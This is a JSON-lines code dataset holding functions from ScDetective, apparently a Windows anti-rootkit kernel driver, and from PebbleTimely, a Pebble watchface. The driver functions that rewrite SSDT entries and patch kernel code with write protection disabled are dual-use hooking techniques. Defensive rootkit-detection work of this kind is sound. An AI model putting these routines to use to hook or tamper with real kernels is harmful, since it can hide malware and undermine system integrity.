{"docstring": "//////////////////////////////////////////////////////////////////////////\n", "func_signal": "PMODULE_LIST_HEAD \nScPsQueryProcessModuleList(PEPROCESS EProcess)", "code": "{\n    HANDLE hThread;\n    PTHREAD_CONTEXT ThreadContext = NULL;\n\n    if (!MmIsAddressValid(EProcess))  return NULL;\n\n    if (g_ModuleListHead)  return g_ModuleListHead;\n\n    g_ModuleListHead = ExAllocatePoolWithTag(NonPagedPool, sizeof(MODULE_LIST_HEAD), MEM_TAG);\n    g_ModuleListHead->NumberOfModules = 0;\n    InitializeListHead(&g_ModuleListHead->ModuleListHead);\n\n    ThreadContext = ExAllocatePoolWithTag(PagedPool, sizeof(THREAD_CONTEXT), MEM_TAG);\n    KeInitializeEvent(&ThreadContext->SynEvent, SynchronizationEvent, FALSE);\n    ThreadContext->Process = EProcess;\n\n    PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, NULL, 0, NULL,\n                         ListModuleThread, ThreadContext);\n    ZwClose(hThread);\n    KeWaitForSingleObject(&ThreadContext->SynEvent, Executive, KernelMode, FALSE, NULL);\n\n    ExFreePoolWithTag(ThreadContext, MEM_TAG);\n    return g_ModuleListHead;\n}", "path": "ScDetective_Driver\\ScDetective\\Process\\Process.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "///////////////////////////////////////////////////////////////////////////////////\n//\n//\t\u02b5\u05a3\u0221SSDT\u0435\u0137\n//\t\n//\tSSDT\u0435\u0137\n//\n///////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "ULONG \nGetSsdtServiceNumber()", "code": "{\n    KdPrint((\"Enter GetSsdtServiceNumber\"));\n    return KeServiceDescriptorTable.NumberOfService;\n}", "path": "ScDetective_Driver\\ScDetective\\ssdt\\ssdt.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n", "func_signal": "VOID \nOpSafeInlineHook(PVOID TargetAddress, PVOID ReadyOpCode, ULONG OpCodeLength)", "code": "{\n    PMDL MdlFuncAddress;\n\n    ASSERT(TargetAddress && ReadyOpCode && OpCodeLength);\n\n    if (ScmMapVirtualAddress(TargetAddress, 0x400, &MdlFuncAddress)) \n    {\n        WPOFF();\n        RtlCopyMemory(TargetAddress, ReadyOpCode, OpCodeLength);\n        WPON();\n        ScmUnmapVirtualAddress(MdlFuncAddress);\n    }\n}", "path": "ScDetective_Driver\\ScDetective\\HookEngine\\HookEngine.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n", "func_signal": "ULONG ExCopyProcessList2Buffer(PPROCESS_INFO ProcessInfo)", "code": "{\n    PPROCESS_INFO tempProcess;\n    ULONG ReturnLength = 0;\n\n    if (g_ProcessListHead == NULL)  return 0;\n\n    while (!IsListEmpty(&g_ProcessListHead->ProcessListHead))\n    {\n        tempProcess = (PPROCESS_INFO)RemoveHeadList(&g_ProcessListHead->ProcessListHead);\n        RtlCopyMemory(ProcessInfo, tempProcess, sizeof(PROCESS_INFO));\n        ExFreePoolWithTag(tempProcess, MEM_TAG);\n        ProcessInfo ++;\n        ReturnLength ++;\n    }\n\n    ExFreePoolWithTag(g_ProcessListHead, MEM_TAG);\n    g_ProcessListHead = NULL;\n    return ReturnLength * sizeof(PROCESS_INFO);\n}", "path": "ScDetective_Driver\\ScDetective\\Process\\Process.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "///////////////////////////////////////////////////////////////////////////////////\n//\n//\t\u02b5\u05a3\u05b8SSDT\u05b8\u0137\u0135\u05b7\n//\tSsdtInfo \u03aa SSDT_ADDRESS \u0375\u05b8\ub8ec\u04aa\u05b8\u0137\u0375\u05b7\n//\tTRUE\u02be\u05b8\u0279\uda9f\udd7bFALSE\u02a7\n//\n///////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "BOOLEAN\nUnHookSsdtItem(\n    IN PSSDT_ADDRESS SsdtInfo\n    )", "code": "{\n    if (SsdtInfo == NULL)\n    {\n        KdPrint((\"[UnHookSsdtItem] \u05b8\u0427\"));\n        return FALSE;\n    }\n\n    if (SetServiceAddress(SsdtInfo->nIndex, SsdtInfo->FunAddress))\n    {\n        KdPrint((\"[UnHookSsdtItem] \u05b8 %d \u0177\u0279\", SsdtInfo->nIndex));\n        return TRUE;\n    }\n    else\n    {\n        KdPrint((\"[UnHookSsdtItem] SetServiceAddress failed\"));\n        return FALSE;\n    }\n}", "path": "ScDetective_Driver\\ScDetective\\ssdt\\ssdt.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "///////////////////////////////////////////////////////////////////////////////////\n//\n//\t\u02b5\u05a3 \u07b8SSDT\u05b8\u0137\u05b7,SSDTHOOK\n//\t ServiceIndex\u03aa\u04aa\u07b8\u0135\u0137SSDT\u0435\n//\t\t\t  NewServiceAddress \u03aa\u04aa\u07b8\u0135\u0137\u00b5\u05b7\n//\t \u05b8\u0131\u07b8\u0137\u052d\u02bc\u05b7\n//\n///////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "ULONG\nSetServiceAddress(\n    IN UINT     ServiceIndex,\n    IN ULONG    NewServiceAddress\n    )", "code": "{\n    PMDL    MdlSystemCall = NULL;\n    PVOID*  MappedPointer = NULL;\n    PULONG  EnabledAddress = NULL;\n    ULONG   OrigServiceAddress = 0;\n    KIRQL   OrigIrql;\n    \n    KdPrint((\"Enter SetServiceAddress\"));\n/*\n    MdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, \n                                KeServiceDescriptorTable.NumberOfService * sizeof(ULONG)\n                                );\n*/\n    MdlSystemCall = IoAllocateMdl(KeServiceDescriptorTable.ServiceTableBase,\n                                  KeServiceDescriptorTable.NumberOfService * sizeof(ULONG),\n                                  FALSE, FALSE, NULL);\n    if (MdlSystemCall == NULL)\n    {\n        KdPrint((\"[SetServiceAddress] MmCreateMdl failed\"));\n        return OrigServiceAddress;\n    }\n\n    MmBuildMdlForNonPagedPool(MdlSystemCall);\n    MdlSystemCall->MdlFlags = MdlSystemCall->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;\n    MappedPointer = MmMapLockedPagesSpecifyCache(MdlSystemCall, KernelMode, MmCached,\n                                                 NULL, FALSE, NormalPagePriority );\n    EnabledAddress = (PULONG)MappedPointer;\n\n    KeRaiseIrql(DISPATCH_LEVEL, &OrigIrql);\n    OrigServiceAddress = EnabledAddress[ServiceIndex];\n    EnabledAddress[ServiceIndex] = NewServiceAddress;\n    KeLowerIrql(OrigIrql);\n\n    MmUnmapLockedPages(MappedPointer, MdlSystemCall);\n    IoFreeMdl(MdlSystemCall);\n    return OrigServiceAddress;\n}", "path": "ScDetective_Driver\\ScDetective\\ssdt\\ssdt.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "/*?, ?  rel32 offset*/\n", "func_signal": "char __fastcall IsRelativeCmd(unsigned char *pOpcode)", "code": "{\n\tUCHAR Flags;\n\tif (*pOpcode == 0x0F) Flags = OpcodeFlagsExt[*(PUCHAR)((ULONG)pOpcode + 1)]; \n\t    else Flags = OpcodeFlags[*pOpcode];\n\treturn (Flags & OP_REL32);\n}", "path": "ScDetective_Driver\\ScDetective\\LDasm\\LDasm.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n", "func_signal": "ULONG ScPsGetPspCidTable()", "code": "{\n    static ULONG PspCidTable = 0;\n    UNICODE_STRING NameString;\n    ULONG FunctionAddress = 0;\n    ULONG address;\n    PDBGKD_GET_VERSION64 KdVersionBlock = NULL;\n    PKDDEBUGGER_DATA64 DebuggerData = NULL;\n    ULONG Time = 4; \n\n    if (PspCidTable != 0)  return PspCidTable;\n\n_retry:\n    KeSetSystemAffinityThread(1);\n    __asm {\n        mov     eax, fs:[0x1c]\n        mov     eax, [eax+0x34]\n        mov     KdVersionBlock, eax\n    }\n    KeRevertToUserAffinityThread();\n\n    if (KdVersionBlock == NULL && \n        Time != 0)  {\n        Time --;  goto _retry;\n    } \n    if (KdVersionBlock != NULL) {\n        DebuggerData = (PKDDEBUGGER_DATA64)*((PULONG)KdVersionBlock->DebuggerDataList);\n        PspCidTable = (ULONG)DebuggerData->PspCidTable;\n        KdPrint((\"[ScPsGetPspCidTable][FS] PspCidTable : 0x%08x\", PspCidTable));\n        return PspCidTable;\n    }\n    \n    RtlInitUnicodeString(&NameString, L\"PsLookupProcessByProcessId\");\n    FunctionAddress = (ULONG)MmGetSystemRoutineAddress(&NameString);\n\n    if (g_WindowsVersion == WINDOWS_VERSION_7) \n    {\n       for (address = FunctionAddress; \n            address < FunctionAddress + PAGE_SIZE; \n            address ++ ) \n       {\n            if (((*(PUSHORT)address) == 0x3D8B) && \n                ((*(PUCHAR)(address + 6)) == 0xE8)) \n            {\t\n                PspCidTable = *(PULONG)(address + 2);\n                KdPrint((\"[GetPspCidTable] Get PspCidTable : 0x%08x\", PspCidTable));\n                return PspCidTable;\n            }\t\n        }\n    } else if (g_WindowsVersion == WINDOWS_VERSION_XP) {\n\n        for (address = FunctionAddress; \n             address < FunctionAddress + PAGE_SIZE; \n             address ++ )\n        {\n            if (((*(PUSHORT)address) == 0x35FF) && \n                ((*(PUCHAR)(address + 6)) == 0xE8))\n            {\t\n                PspCidTable = *(PULONG)(address + 2);\n                KdPrint((\"[GetPspCidTable] Get PspCidTable : 0x%08x\", PspCidTable));\n                return PspCidTable;\n            }\t\n        }\n    }\n    KdPrint((\"[GetPspCidTable] Get PspCidTable fs: 0x%08x\", PspCidTable));\n    return PspCidTable;\n}", "path": "ScDetective_Driver\\ScDetective\\Process\\Process.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n", "func_signal": "ULONG GetPebCommonAddress()", "code": "{\n    ULONG address;\n    PEPROCESS Process;\n\n    //\n    //system\u0335peb \u05bb\u0435\u0225\n    //\n    Process = (PEPROCESS)((ULONG)((PLIST_ENTRY)\n        ((ULONG)g_SystemProcess + offset_Process_ActiveProcessLinks))->Flink - offset_Process_ActiveProcessLinks);\n    address = *(PULONG)((ULONG)Process + offset_Process_Peb);\n\n    return (address & 0xFFFF0000);  \n}", "path": "ScDetective_Driver\\ScDetective\\Process\\Process.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n", "func_signal": "ULONG ExCopyThreadList2Buffer(PTHREAD_INFO ThreadInfo)", "code": "{\n    PTHREAD_INFO tempThread;\n    ULONG ReturnLength = 0;\n\n    if (g_ThreadListHead == NULL)  return 0;\n\n    while (!IsListEmpty(&g_ThreadListHead->ThreadListHead))\n    {\n        tempThread = (PTHREAD_INFO)RemoveHeadList(&g_ThreadListHead->ThreadListHead);\n        RtlCopyMemory(ThreadInfo, tempThread, sizeof(THREAD_INFO));\n        ExFreePoolWithTag(tempThread, MEM_TAG);\n        ThreadInfo ++;\n        ReturnLength ++;\n    }\n\n    ExFreePoolWithTag(g_ThreadListHead, MEM_TAG);\n    g_ThreadListHead = NULL;\n    return ReturnLength * sizeof(THREAD_INFO);\n}", "path": "ScDetective_Driver\\ScDetective\\Process\\Process.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "//\n// \u07f3\u03e2\u03e2\n//\n", "func_signal": "PEPROCESS ScPsGetThreadProcess(PETHREAD Thread)", "code": "{\n    PKAPC_STATE ApcState = NULL;\n    UCHAR ApcStateIndex;\n\n    if (!MmIsAddressValid(Thread))  return NULL;\n\n    __try {\n        ApcStateIndex = *(PUCHAR)((ULONG)Thread + offset_Thread_ApcStateIndex);\n\n        if (ApcStateIndex == 0) {\n\n            ApcState = (PKAPC_STATE)((ULONG)Thread + offset_Thread_ApcState);\n            return (PEPROCESS)ApcState->Process;\n\n        } else if (ApcStateIndex == 1) {\n\n            ApcState = (PKAPC_STATE)((ULONG)Thread + offset_Thread_SavedApcState);\n            return (PEPROCESS)ApcState->Process;\n\n        } else {\n\n            return PsGetThreadProcess(Thread);\n        }\n    } \n    __except(EXCEPTION_EXECUTE_HANDLER) { return NULL; }\n}", "path": "ScDetective_Driver\\ScDetective\\Process\\Process.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "///////////////////////////////////////////////////////////////////////////////////\n//\n//\t\u02b5\u05a3\u00f6SSDT\u0435\u0137\u05b7\n//\tAddressInfo \u03aa\u03aa PSSDT_INFO\u05b8,\u03aaNULL\u02b1Length\u0434\u04aa\u013b\u0223\n//\t\t\t Length\u03aa\u05b8\ub8ec\u06ba\u02b1\u0132\u0434\ubefa\u0773\n//\tSSDT\u0435\u0137\n//\n///////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "ULONG \nGetSsdtCurrentAddresses (\n    IN PSSDT_ADDRESS AddressInfo, \n    OUT IN PULONG Length\n    )", "code": "{\n    ULONG   ServiceNumber;\n    ULONG   index;\n\n    ServiceNumber = KeServiceDescriptorTable.NumberOfService;\n\n    if (ServiceNumber * sizeof(SSDT_ADDRESS) > *Length)\n    {\n        *Length = ServiceNumber * sizeof(SSDT_ADDRESS);\n        return 0;\n    }\n\n    if (AddressInfo == NULL)\n    {\n        *Length = ServiceNumber * sizeof(SSDT_ADDRESS);\n        return 0;\n    }\n\n    for (index = 0; index < ServiceNumber; index++)\n    {\n        AddressInfo[index].nIndex = index;\n        AddressInfo[index].FunAddress = (DWORD)KeServiceDescriptorTable.ServiceTableBase[index];\n    }\n\n    *Length = ServiceNumber * sizeof(SSDT_ADDRESS);\n    return  ServiceNumber;\n}", "path": "ScDetective_Driver\\ScDetective\\ssdt\\ssdt.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n", "func_signal": "PPROCESS_LIST_HEAD ScPsQuerySystemProcessList()", "code": "{\n    PPROCESS_INFO IdleProcess = NULL;\n\n    if (g_ProcessListHead)  return g_ProcessListHead;\n\n    g_ProcessListHead = ExAllocatePoolWithTag(NonPagedPool, sizeof(PROCESS_LIST_HEAD), MEM_TAG);\n\n    InitializeListHead(&g_ProcessListHead->ProcessListHead);\n    g_ProcessListHead->NumberOfProcesses = 0;\n\n    //\n    // Insert system idle process\n    //\n    if (g_IdleProcess == NULL)  goto _Ignore;\n\n    IdleProcess = ExAllocatePoolWithTag(NonPagedPool, sizeof(PROCESS_INFO), MEM_TAG);\n    RtlZeroMemory(IdleProcess, sizeof(PROCESS_INFO));\n    IdleProcess->EProcess = (ULONG)g_IdleProcess;\n    RtlCopyMemory(IdleProcess->ImagePath, L\"Idle\", sizeof(L\"Idle\"));\n    IdleProcess->InheritedProcessId = *(PULONG)((PUCHAR)g_IdleProcess + offset_Process_InheritedProcessId);\n    IdleProcess->UniqueProcessId = *(PULONG)((PUCHAR)g_IdleProcess + offset_Process_UniqueProcessId);\n    InsertTailList(&g_ProcessListHead->ProcessListHead, &IdleProcess->ProcessLink);\n\n    g_ProcessListHead->NumberOfProcesses ++;\n\n_Ignore:\n    EnumerateProcessByPspCidTable();\n    EnumerateProcessByMemorySearch();\n\n    return g_ProcessListHead;\n}", "path": "ScDetective_Driver\\ScDetective\\Process\\Process.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n", "func_signal": "VOID BrowseTable_L1(ULONG TableAddress)", "code": "{\n    while ((*(PULONG)TableAddress) != 0)\n    {\n        BrowseTable_L2(*(PULONG)TableAddress);\n        TableAddress += 4;\n    }\n}", "path": "ScDetective_Driver\\ScDetective\\Process\\Process.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n", "func_signal": "PVOID ScmMapVirtualAddress(PVOID VirtualAddress, ULONG Length, __out PMDL* MdlAddress)", "code": "{\n    PVOID result = NULL;\n    PMDL MdlAllocate = NULL;\n    PMDL MdlNext = NULL;\n\n    MdlAllocate = IoAllocateMdl(VirtualAddress, Length, FALSE, FALSE, NULL);\n    MdlAddress[0] = MdlAllocate;\n\n    if (MdlAllocate == NULL)  return result;\n\n    MmProbeAndLockPages(MdlAllocate, KernelMode, IoModifyAccess);\n    MdlNext = MdlAddress[0];\n\n    if (MdlNext->MdlFlags & 5) {\n        result = MdlNext->MappedSystemVa;\n    } else {\n        result = MmMapLockedPagesSpecifyCache(MdlNext, KernelMode, MmCached, NULL, 0, NormalPagePriority);\n    }\n    return result;\n}", "path": "ScDetective_Driver\\ScDetective\\Memory\\memory.c", "repo_name": "kedebug/ScDetective", "stars": 83, "license": "None", "language": "c", "size": 425}
{"docstring": "/* relative error < 2e-11 on [-1, 1] */\n", "func_signal": "float my_acos (float x)", "code": "{\n  float xa, t;\n  xa = my_fabs (x);\n  /* arcsin(x) = pi/2 - 2 * arcsin (sqrt ((1-x) / 2)) \n   * arccos(x) = pi/2 - arcsin(x)\n   * arccos(x) = 2 * arcsin (sqrt ((1-x) / 2))\n   */\n  if (xa > 0.5625) {\n    t = 2.0 * asin_core (my_sqrt (0.5 * (1.0 - xa)));\n  } else {\n    t = 1.5707963267948966 - asin_core (xa);\n  }\n  /* arccos (-x) = pi - arccos(x) */\n  return (x < 0.0) ? (3.1415926535897932 - t) : t;\n}", "path": "src\\math.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "// Zoom effect.\n// Added by Ron64\n// Parameter: Y zoom (high byte) X zoom(low byte),  0x10 no zoom 0x20 200% 0x08 50%, \n// use the percentage macro EL_ZOOM(150,60). In this example: Y- zoom in 150%, X- zoom out to 60% \n", "func_signal": "void effect_zoom(GContext* ctx,  GRect position, void* param)", "code": "{\n  GBitmap *fb = graphics_capture_frame_buffer(ctx);\n  uint8_t *bd =  gbitmap_get_data(fb);\n  int bpr = gbitmap_get_bytes_per_row(fb);\n\n  uint8_t xCn, yCn, Y1,X1, ratioY, ratioX;\n  xCn= position.origin.x + position.size.w /2;\n  yCn= position.origin.y + position.size.h /2;\n\n  ratioY= (int32_t)param >>8 & 0xFF;\n  ratioX= (int32_t)param & 0xFF;\n\n  for (int y = 0; y <= position.size.h>>1; y++)\n    for (int x = 0; x <= position.size.w>>1; x++)\n    {\n      //yS,xS scan source: centre to out or out to centre\n      int8_t yS = (ratioY>16) ? (position.size.h/2)- y: y; \n      int8_t xS = (ratioX>16) ? (position.size.w/2)- x: x;\n      Y1= (yS<<4) /ratioY;\n      X1= (xS<<4) /ratioX;\n      set_pixel(bd,bpr, yCn +yS, xCn +xS, get_pixel(bd,bpr, yCn +Y1, xCn +X1)); \n      set_pixel(bd,bpr, yCn +yS, xCn -xS, get_pixel(bd,bpr, yCn +Y1, xCn -X1));\n      set_pixel(bd,bpr, yCn -yS, xCn +xS, get_pixel(bd,bpr, yCn -Y1, xCn +X1));\n      set_pixel(bd,bpr, yCn -yS, xCn -xS, get_pixel(bd,bpr, yCn -Y1, xCn -X1));\n    }\n  graphics_release_frame_buffer(ctx, fb);\n//Todo: Should probably reduce Y size on zoom out or limit reading beyond edge of screen.\n}", "path": "src\\effects.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "// vertical mirror effect.\n", "func_signal": "void effect_mirror_vertical(GContext* ctx, GRect position, void* param)", "code": "{\n  uint8_t temp_pixel;  \n  \n  //capturing framebuffer bitmap\n  GBitmap *fb = graphics_capture_frame_buffer(ctx);\n  uint8_t *bitmap_data =  gbitmap_get_data(fb);\n  int bytes_per_row = gbitmap_get_bytes_per_row(fb);\n\n  for (int y = 0; y < position.size.h / 2 ; y++)\n     for (int x = 0; x < position.size.w; x++){\n        temp_pixel = get_pixel(bitmap_data, bytes_per_row, y + position.origin.y, x + position.origin.x);\n        set_pixel(bitmap_data, bytes_per_row, y + position.origin.y, x + position.origin.x, get_pixel(bitmap_data, bytes_per_row, position.origin.y + position.size.h - y - 2, x + position.origin.x));\n        set_pixel(bitmap_data, bytes_per_row, position.origin.y + position.size.h - y - 2, x + position.origin.x, temp_pixel);\n     }\n  \n  graphics_release_frame_buffer(ctx, fb);\n}", "path": "src\\effects.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "// inverter effect.\n", "func_signal": "void effect_invert(GContext* ctx,  GRect position, void* param)", "code": "{\n  //capturing framebuffer bitmap\n  GBitmap *fb = graphics_capture_frame_buffer(ctx);\n  uint8_t *bitmap_data =  gbitmap_get_data(fb);\n  int bytes_per_row = gbitmap_get_bytes_per_row(fb);\n\n  \n  for (int y = 0; y < position.size.h; y++)\n     for (int x = 0; x < position.size.w; x++)\n        #ifdef PBL_COLOR // on Basalt simple doing NOT on entire returned byte/pixel\n          set_pixel(bitmap_data, bytes_per_row, y + position.origin.y, x + position.origin.x, ~get_pixel(bitmap_data, bytes_per_row, y + position.origin.y, x + position.origin.x));\n        #else // on Aplite since only 1 and 0 is returning, doing \"not\" by 1 - pixel\n          set_pixel(bitmap_data, bytes_per_row, y + position.origin.y, x + position.origin.x, 1 - get_pixel(bitmap_data, bytes_per_row, y + position.origin.y, x + position.origin.x));\n        #endif\n \n  graphics_release_frame_buffer(ctx, fb);          \n          \n}", "path": "src\\effects.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "/* not quite rint(), i.e. results not properly rounded to nearest-or-even */\n", "func_signal": "float my_rint (float x)", "code": "{\n  float t = my_floor (my_fabs(x) + 0.5);\n  return (x < 0.0) ? -t : t;\n}", "path": "src\\math.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "// create effect layer\n", "func_signal": "EffectLayer* effect_layer_create(GRect frame)", "code": "{\n    \n  //creating base layer\n  Layer* layer =layer_create_with_data(frame, sizeof(EffectLayer));\n  layer_set_update_proc(layer, effect_layer_update_proc);\n  EffectLayer* effect_layer = (EffectLayer*)layer_get_data(layer);\n  memset(effect_layer,0,sizeof(EffectLayer));\n  effect_layer->layer = layer;\n\n  return effect_layer;                    \n}", "path": "src\\effect_layer.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "/* minimax approximation to cos on [-pi/4, pi/4] with rel. err. ~= 7.5e-13 */\n", "func_signal": "float cos_core (float x)", "code": "{\n  float x8, x4, x2;\n  x2 = x * x;\n  x4 = x2 * x2;\n  x8 = x4 * x4;\n  /* evaluate polynomial using Estrin's scheme */\n  return (-2.7236370439787708e-7 * x2 + 2.4799852696610628e-5) * x8 +\n         (-1.3888885054799695e-3 * x2 + 4.1666666636943683e-2) * x4 +\n         (-4.9999999999963024e-1 * x2 + 1.0000000000000000e+0);\n}", "path": "src\\math.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "// on layer update - apply effect\n", "func_signal": "static void effect_layer_update_proc(Layer *me, GContext* ctx)", "code": "{\n  static uint8_t parent_layer_offset = 0xff;\n  if(parent_layer_offset == 0xff) {\n    parent_layer_offset = find_parent_offset();\n  }\n  \n  // retrieving layer and its real coordinates\n  EffectLayer* effect_layer = (EffectLayer*)(layer_get_data(me));\n  GRect layer_frame = layer_get_frame(me);\n  Layer* l = me;\n  while((l=((Layer**)(void*)l)[parent_layer_offset])) {\n    GRect parent_frame = layer_get_frame(l);\n    layer_frame.origin.x += parent_frame.origin.x;\n    layer_frame.origin.y += parent_frame.origin.y;\n  }\n  \n  // Applying effects\n  for(uint8_t i=0; effect_layer->effects[i] && i<MAX_EFFECTS;++i) effect_layer->effects[i](ctx, layer_frame, effect_layer->params[i]);\n}", "path": "src\\effect_layer.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "// horizontal mirror effect.\n", "func_signal": "void effect_mirror_horizontal(GContext* ctx, GRect position, void* param)", "code": "{\n  uint8_t temp_pixel;  \n  \n  //capturing framebuffer bitmap\n  GBitmap *fb = graphics_capture_frame_buffer(ctx);\n  uint8_t *bitmap_data =  gbitmap_get_data(fb);\n  int bytes_per_row = gbitmap_get_bytes_per_row(fb);\n\n\n  for (int y = 0; y < position.size.h; y++)\n     for (int x = 0; x < position.size.w / 2; x++){\n        temp_pixel = get_pixel(bitmap_data, bytes_per_row, y + position.origin.y, x + position.origin.x);\n        set_pixel(bitmap_data, bytes_per_row, y + position.origin.y, x + position.origin.x, get_pixel(bitmap_data, bytes_per_row, y + position.origin.y, position.origin.x + position.size.w - x - 2));\n        set_pixel(bitmap_data, bytes_per_row, y + position.origin.y, position.origin.x + position.size.w - x - 2, temp_pixel);\n     }\n  \n  graphics_release_frame_buffer(ctx, fb);\n}", "path": "src\\effects.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "// get pixel color at given coordinates \n", "func_signal": "uint8_t get_pixel(uint8_t *bitmap_data, int bytes_per_row, int y, int x)", "code": "{\n  \n  #ifdef PBL_COLOR\n    return bitmap_data[y*bytes_per_row + x]; // in Basalt - simple get entire byte\n  #else\n    return (bitmap_data[y*bytes_per_row + x / 8] >> (x % 8)) & 1; // in Aplite - get the bit\n  #endif\n}", "path": "src\\effects.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "/* minimax approximation to arcsin on [0, 0.5625] with rel. err. ~= 1.5e-11 */\n", "func_signal": "float asin_core (float x)", "code": "{\n  float x8, x4, x2;\n  x2 = x * x;\n  x4 = x2 * x2;\n  x8 = x4 * x4;\n  /* evaluate polynomial using a mix of Estrin's and Horner's scheme */\n  return (((4.5334220547132049e-2 * x2 - 1.1226216762576600e-2) * x4 +\n           (2.6334281471361822e-2 * x2 + 2.0596336163223834e-2)) * x8 +\n          (3.0582043602875735e-2 * x2 + 4.4630538556294605e-2) * x4 +\n          (7.5000364034134126e-2 * x2 + 1.6666666300567365e-1)) * x2 * x + x; \n}", "path": "src\\math.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "// Rotate 90 degrees\n// Added by Ron64\n// Parameter:  true: rotate right/clockwise,  false: rotate left/counter_clockwise\n", "func_signal": "void effect_rotate_90_degrees(GContext* ctx,  GRect position, void* param)", "code": "{\n\n  //capturing framebuffer bitmap\n  GBitmap *fb = graphics_capture_frame_buffer(ctx);\n  uint8_t *bitmap_data =  gbitmap_get_data(fb);\n  int bytes_per_row = gbitmap_get_bytes_per_row(fb);\n\n  bool right = (bool)param;\n  uint8_t qtr, xCn, yCn, temp_pixel;\n  xCn= position.origin.x + position.size.w /2;\n  yCn= position.origin.y + position.size.h /2;\n  qtr=position.size.w;\n  if (position.size.h < qtr)\n    qtr= position.size.h;\n  qtr= qtr/2;\n\n  for (int c1 = 0; c1 < qtr; c1++)\n    for (int c2 = 1; c2 < qtr; c2++){\n      temp_pixel = get_pixel(bitmap_data, bytes_per_row, yCn +c1, xCn +c2);\n      if (right){\n        set_pixel(bitmap_data, bytes_per_row, yCn +c1, xCn +c2, get_pixel(bitmap_data, bytes_per_row, yCn -c2, xCn +c1));\n        set_pixel(bitmap_data, bytes_per_row, yCn -c2, xCn +c1, get_pixel(bitmap_data, bytes_per_row, yCn -c1, xCn -c2));\n        set_pixel(bitmap_data, bytes_per_row, yCn -c1, xCn -c2, get_pixel(bitmap_data, bytes_per_row, yCn +c2, xCn -c1));\n        set_pixel(bitmap_data, bytes_per_row, yCn +c2, xCn -c1, temp_pixel);\n      }\n      else{\n        set_pixel(bitmap_data, bytes_per_row, yCn +c1, xCn +c2, get_pixel(bitmap_data, bytes_per_row, yCn +c2, xCn -c1));\n        set_pixel(bitmap_data, bytes_per_row, yCn +c2, xCn -c1, get_pixel(bitmap_data, bytes_per_row, yCn -c1, xCn -c2));\n        set_pixel(bitmap_data, bytes_per_row, yCn -c1, xCn -c2, get_pixel(bitmap_data, bytes_per_row, yCn -c2, xCn +c1));\n        set_pixel(bitmap_data, bytes_per_row, yCn -c2, xCn +c1, temp_pixel);\n      }\n     }\n  \n  graphics_release_frame_buffer(ctx, fb);\n}", "path": "src\\effects.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "//sets effect for the layer\n", "func_signal": "void effect_layer_add_effect(EffectLayer *effect_layer, effect_cb* effect, void* param)", "code": "{\n  if(effect_layer->next_effect<MAX_EFFECTS) {\n    effect_layer->effects[effect_layer->next_effect] = effect;\n    effect_layer->params[effect_layer->next_effect] = param;  \n    ++effect_layer->next_effect;\n  }\n}", "path": "src\\effect_layer.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
